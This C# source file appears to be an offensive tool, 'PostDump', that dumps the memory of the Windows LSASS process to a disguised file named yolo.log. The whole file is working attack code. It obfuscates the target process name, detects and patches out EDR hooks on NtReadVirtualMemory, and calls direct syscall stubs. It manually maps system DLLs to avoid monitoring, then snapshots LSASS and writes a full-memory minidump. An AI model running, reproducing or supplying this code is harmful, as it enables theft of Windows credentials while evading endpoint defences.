using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using Data = DCall.Data;
using ManualMap = DCall.ManualMap;
using DInvoke = DCall.DynamicInvoke;
using DWORD = System.Int32;
using BOOL = System.Int32;
using HANDLE = System.IntPtr;
using HPSS = System.IntPtr;
using PVOID = System.IntPtr;
using PMINIDUMP_CALLBACK_INPUT = System.IntPtr;
using PMINIDUMP_CALLBACK_OUTPUT = System.IntPtr;
using PMINIDUMP_EXCEPTION_INFORMATION = System.IntPtr;
using PMINIDUMP_USER_STREAM_INFORMATION = System.IntPtr;
using PMINIDUMP_CALLBACK_INFORMATION = System.IntPtr;

namespace PostDump
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        public delegate bool MiniDumpWriteDump(HANDLE hProcess, DWORD ProcessId, Microsoft.Win32.SafeHandles.SafeFileHandle hFile, Data.Native.MINIDUMP_TYPE DumpType, PMINIDUMP_EXCEPTION_INFORMATION ExceptionParam, PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam, PMINIDUMP_CALLBACK_INFORMATION CallbackParam);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate Data.Native.NTSTATUS NtOpenProcess(ref IntPtr processHandle, uint desiredAccess, ref Data.Native.OBJECT_ATTRIBUTES objectAttributes, ref Data.Native.CLIENT_ID clientId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate BOOL MiniDumpCallback(PVOID CallbackParam, PMINIDUMP_CALLBACK_INPUT CallbackInput, PMINIDUMP_CALLBACK_OUTPUT CallbackOutput);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        internal static BOOL MiniDumpCallbackMethod(PVOID parameter, PMINIDUMP_CALLBACK_INPUT inp, PMINIDUMP_CALLBACK_OUTPUT op)
        {
            unsafe
            {
                if (Marshal.ReadByte(inp + sizeof(int) + IntPtr.Size) == (int)Data.Native.MINIDUMP_CALLBACK_TYPE.IsProcessSnapshotCallback)
                {
                    var obj = (Data.Native.MINIDUMP_CALLBACK_OUTPUT*)op;
                    obj->Status = 1;
                }
            }

            return 1;
        }


        [DllImport("kernel32")]
        internal static extern DWORD PssQuerySnapshot(HPSS SnapshotHandle, Data.Native.PSS_QUERY_INFORMATION_CLASS InformationClass, out IntPtr Buffer, DWORD BufferLength);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate DWORD PssCaptureSnapshot(HANDLE ProcessHandle, Data.Native.PSS_CAPTURE_FLAGS CaptureFlags, DWORD ThreadContextFlags, out HPSS SnapshotHandle);


        [DllImport("kernel32")]
        internal static extern DWORD PssFreeSnapshot(HANDLE ProcessHandle, HPSS SnapshotHandle);

        [DllImport("kernel32")]
        internal static extern BOOL CloseHandle(HANDLE hObject);


        
        static (string value, byte[] data, bool id) Check(IntPtr addr)
        {
            byte[] b = new byte[24];
            for (int a = 0; a < 24; a++)
            {
                b[a]= Marshal.ReadByte(addr, a);
            }

            if ( b[0] == 0xE9 )
            {
                return ("HOOKED!", b, true);
            }
            else
            {
                return ("NOT Hooked!", b, false);
            }
        }


        static void Main(string[] args)
        {

            string ProcName = "l" + "sa" + "ss";
            string path = Directory.GetCurrentDirectory();
            string FilePath = path + "\\yolo.log";
            FileStream dumpFile = new FileStream(FilePath, FileMode.Create);


            Process[] proc = Process.GetProcessesByName(ProcName);
            IntPtr proc_pid = (IntPtr)(proc[0].Id);
            //IntPtr proc_pid = (IntPtr)uint.Parse(args[0]);

            IntPtr proc_handle = IntPtr.Zero;
            Data.Native.OBJECT_ATTRIBUTES oa = new Data.Native.OBJECT_ATTRIBUTES();
            Data.Native.CLIENT_ID ci = new Data.Native.CLIENT_ID()
            {
                UniqueProcess = (IntPtr)proc_pid,
            };

            IntPtr ntr = DInvoke.Generic.GetLibraryAddress("ntdll.dll", "NtReadVirtualMemory", true);
            var rez = Check(ntr);
            if ( rez.id ) 
            {
                // Get unhooked NtReadVirtualMemory
                Console.WriteLine("NtReadVirtualMemory: HOOKED! Patching...");
                IntPtr stub0 = DInvoke.Generic.GetSyscallStub("NtReadVirtualMemory");
                byte[] b = new byte[24];
                for (int a = 0; a < 24; a++)
                {
                    b[a] = Marshal.ReadByte(stub0, a);
                }

                // get unhooked VirtualProtect function
                Data.PE.PE_MANUAL_MAP moduleDetails0 = ManualMap.Map.MapModuleToMemory("C:\\Windows\\System32\\kernel32.dll");
                IntPtr s = DInvoke.Generic.GetExportAddress(moduleDetails0.ModuleBase, "VirtualProtect");
                VirtualProtect VP = (VirtualProtect)Marshal.GetDelegateForFunctionPointer(s, typeof(VirtualProtect));
                // Patch hooked NtReadVirtualMemory
                VP(ntr, (UIntPtr)b.Length, 0x40, out uint old);
                Marshal.Copy(b, 0, ntr, b.Length);
                VP(ntr, (UIntPtr)b.Length, old, out uint _);
                Console.WriteLine("NtReadVirtualMemory --> " + Check(ntr).value);
            } else
            {
                var p = Check(ntr);
                Console.WriteLine("NtReadVirtualMemory --> " + Check(ntr).value);
            }


            IntPtr stub = DInvoke.Generic.GetSyscallStub("NtOpenProcess");
            Console.WriteLine("NtOpenProcess: " + Check(stub).value);
            NtOpenProcess NTOP = (NtOpenProcess)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtOpenProcess));
            Data.Native.NTSTATUS retValue = NTOP(ref proc_handle, (uint)0x0040 | (uint)0x0400 | (uint)0x0080, ref oa, ref ci);

            if (retValue == Data.Native.NTSTATUS.Success)
            {
                Console.WriteLine("Real Process Handle: " + proc_handle);
            }
            else
            {
                Console.WriteLine("cannot open process!");
                return;
            }

            var flags = Data.Native.PSS_CAPTURE_FLAGS.PSS_CAPTURE_VA_CLONE |
                        Data.Native.PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLES |
                        Data.Native.PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLE_NAME_INFORMATION |
                        Data.Native.PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLE_BASIC_INFORMATION |
                        Data.Native.PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION |
                        Data.Native.PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLE_TRACE |
                        Data.Native.PSS_CAPTURE_FLAGS.PSS_CAPTURE_THREADS |
                        Data.Native.PSS_CAPTURE_FLAGS.PSS_CAPTURE_THREAD_CONTEXT |
                        Data.Native.PSS_CAPTURE_FLAGS.PSS_CREATE_MEASURE_PERFORMANCE;


            HPSS sHandle;
            Data.PE.PE_MANUAL_MAP moduleDetails = ManualMap.Map.MapModuleToMemory("C:\\Windows\\System32\\kernel32.dll");
            IntPtr sd = DInvoke.Generic.GetExportAddress(moduleDetails.ModuleBase, "PssCaptureSnapshot");
            Console.WriteLine("PssCaptureSnapshot: " + Check(sd).value);
            PssCaptureSnapshot PSS = (PssCaptureSnapshot)Marshal.GetDelegateForFunctionPointer(sd, typeof(PssCaptureSnapshot));
            DWORD hresult = PSS(proc_handle, flags, IntPtr.Size == 8 ? 0x0010001F : 0x0001003F, out sHandle);
            if (hresult != 0)
            {
                Console.WriteLine($"Sorry the Snapshot failed :( ({hresult})");
                return;
            }
            else
            {
                Console.WriteLine("Snapshot succeed! Duplicate handle: " + sHandle);
            }

            var CbackDelegate = new MiniDumpCallback(MiniDumpCallbackMethod);
            var CbackParam = Marshal.AllocHGlobal(IntPtr.Size * 2);
            unsafe
            {
                var pointr = (Data.Native.MINIDUMP_CALLBACK_INFORMATION*)CbackParam;
                pointr->CallbackRoutine = Marshal.GetFunctionPointerForDelegate(CbackDelegate);
                pointr->CallbackParam = IntPtr.Zero;
            }

            var MFlag = Data.Native.MINIDUMP_TYPE.MiniDumpWithDataSegs |
                                Data.Native.MINIDUMP_TYPE.MiniDumpWithTokenInformation |
                                Data.Native.MINIDUMP_TYPE.MiniDumpWithPrivateWriteCopyMemory |
                                Data.Native.MINIDUMP_TYPE.MiniDumpWithPrivateReadWriteMemory |
                                Data.Native.MINIDUMP_TYPE.MiniDumpWithUnloadedModules |
                                Data.Native.MINIDUMP_TYPE.MiniDumpWithFullMemory |
                                Data.Native.MINIDUMP_TYPE.MiniDumpWithHandleData |
                                Data.Native.MINIDUMP_TYPE.MiniDumpWithThreadInfo |
                                Data.Native.MINIDUMP_TYPE.MiniDumpWithFullMemoryInfo |
                                Data.Native.MINIDUMP_TYPE.MiniDumpWithProcessThreadData |
                                Data.Native.MINIDUMP_TYPE.MiniDumpWithModuleHeaders;


            Data.PE.PE_MANUAL_MAP moduleDetails2 = ManualMap.Map.MapModuleToMemory("C:\\Windows\\System32\\dbghelp.dll");

            if (File.Exists("C:\\Windows\\System32\\dbgcore.dll"))
            {
                moduleDetails2 = ManualMap.Map.MapModuleToMemory("C:\\Windows\\System32\\dbgcore.dll");
            } 
            
            IntPtr mini = DInvoke.Generic.GetExportAddress(moduleDetails2.ModuleBase, "MiniDumpWriteDump");
            Console.WriteLine("MiniDumpWriteDump: " + Check(mini).value);
            MiniDumpWriteDump MDWD = (MiniDumpWriteDump)Marshal.GetDelegateForFunctionPointer(mini, typeof(MiniDumpWriteDump));
            var success = MDWD(sHandle, 0, dumpFile.SafeFileHandle, MFlag, IntPtr.Zero, IntPtr.Zero, CbackParam);

            if (success)
            {
                var info = new FileInfo(FilePath);
                Console.WriteLine($"Duplicate dump successful. Dumped {info.Length} bytes to: " + FilePath);

            }
            else
            {
                Console.WriteLine("Dump failed !");
                return;
            }


            // Cleaning
            IntPtr VcHandle;
            PssQuerySnapshot(sHandle, Data.Native.PSS_QUERY_INFORMATION_CLASS.PSS_QUERY_VA_CLONE_INFORMATION, out VcHandle, IntPtr.Size);
            DWORD free = PssFreeSnapshot(Process.GetCurrentProcess().Handle, sHandle);
            CloseHandle(VcHandle);
            Marshal.FreeHGlobal(CbackParam);
            GC.KeepAlive(CbackDelegate);
        }
    }
}

